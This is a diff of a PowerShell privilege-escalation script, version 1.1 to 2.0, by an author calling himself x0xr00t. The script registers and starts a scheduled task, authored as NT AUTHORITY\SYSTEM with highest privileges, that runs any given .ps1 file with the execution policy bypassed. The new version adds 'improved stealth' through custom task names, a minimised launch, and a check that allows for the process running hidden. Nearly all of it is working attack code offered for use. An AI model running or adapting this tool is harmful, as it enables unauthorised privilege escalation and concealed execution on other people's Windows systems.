@@ -1,14 +1,16 @@
 # Author: phoogeveen aka x0xr00t
-# Description: This script creates a scheduled task for privilege escalation by running a PowerShell script with the highest privileges.
-# Version: 1.1
+# Description: Enhanced script for creating a scheduled task with custom name, start time, and improved stealth.
+# Version: 2.0
 
 param(
-    [string]$FilePath
+    [string]$FilePath,
+    [string]$CustTaskName = "ElevatedTask",  # Default task name if none is provided
+    [datetime]$Time  # Optional start time
 )
 
 # Check if the FilePath parameter was provided, or prompt the user
 if (-not $FilePath) {
-    Write-Host "No -File parameter provided. Please specify the path to the .ps1 script."
+    Write-Host "No -FilePath parameter provided. Please specify the path to the .ps1 script."
     $FilePath = Read-Host -Prompt "Enter the full path to the PowerShell script (.ps1)"
 }
 
@@ -18,16 +20,15 @@ if (-not (Test-Path -Path $FilePath -PathType Leaf)) {
     exit
 }
 
-# Get the current system time
+# Determine the start time for the scheduled task
 $currentDateTime = Get-Date
-Write-Output "Current system time: $currentDateTime"
+if (-not $Time) {
+    $Time = $currentDateTime.AddMinutes(2)
+    Write-Output "No -Time parameter provided. Defaulting start time to 2 minutes from now: $Time"
+}
 
-# Calculate the start time by adding 2 minutes to the current time
-$startTime = $currentDateTime.AddMinutes(2)
-Write-Output "Scheduled task will start at: $startTime"
-
-# Format the start time for use in XML (in UTC format)
-$formattedStartTime = $startTime.ToString("yyyy-MM-ddTHH:mm:ss")
+# Format the start time for XML (in UTC format)
+$formattedStartTime = $Time.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss")
 Write-Output "Formatted start time for XML: $formattedStartTime"
 
 # Define the XML for the scheduled task
@@ -37,7 +38,7 @@ $taskXml = @"
   <RegistrationInfo>
     <Date>$formattedStartTime</Date>
     <Author>NT AUTHORITY\SYSTEM</Author>
-    <URI>\ElevatedTask</URI>
+    <URI>\$CustTaskName</URI>
   </RegistrationInfo>
   <Triggers>
     <TimeTrigger>
@@ -73,44 +74,40 @@ $taskXml = @"
   <Actions Context="Author">
     <Exec>
       <Command>cmd.exe</Command>
-      <Arguments>/c start /b "" conhost.exe cmd.exe /K powershell.exe -NoProfile -ExecutionPolicy Bypass -File "$FilePath"</Arguments>
+      <Arguments>/c start /min conhost.exe cmd.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$FilePath`"</Arguments>
       <WorkingDirectory>$([System.IO.Path]::GetDirectoryName($FilePath))</WorkingDirectory>
     </Exec>
   </Actions>
 </Task>
 "@
 
-# Ensure that the scheduled task XML is valid
-if (-not $taskXml) {
-    Write-Error "Failed to create XML for scheduled task."
-    exit
-}
-
 # Register the scheduled task with the XML definition
 try {
-    Register-ScheduledTask -Xml $taskXml -TaskName "ElevatedTask" -Force
-    Write-Output "Scheduled task 'ElevatedTask' registered successfully."
+    Register-ScheduledTask -Xml $taskXml -TaskName $CustTaskName -Force
+    Write-Output "Scheduled task '$CustTaskName' registered successfully."
 } catch {
     Write-Error "Failed to register scheduled task: $_"
     exit
 }
 
-# Start the scheduled task immediately
+# Start the scheduled task immediately if it's due
 try {
-    Start-ScheduledTask -TaskName "ElevatedTask"
-    Write-Output "Scheduled task 'ElevatedTask' started successfully."
+    Start-ScheduledTask -TaskName $CustTaskName
+    Write-Output "Scheduled task '$CustTaskName' started successfully."
 } catch {
     Write-Error "Failed to start scheduled task: $_"
     exit
 }
 
-# Wait for the task to start (adjust time as needed)
-Start-Sleep -Seconds 5  
-
-# Get the process ID of the started task to verify it's running
+# Verify the process is running
+Start-Sleep -Seconds 5
 try {
     $processId = Get-WmiObject Win32_Process | Where-Object {$_.CommandLine -like "*powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$FilePath`""} | Select-Object -ExpandProperty ProcessId
-    Write-Output "Process ID of the started process: $processId"
+    if ($processId) {
+        Write-Output "Process ID of the started process: $processId"
+    } else {
+        Write-Output "Process not detected, it might be running hidden or scheduled later."
+    }
 } catch {
     Write-Error "Failed to retrieve process ID: $_"
 }
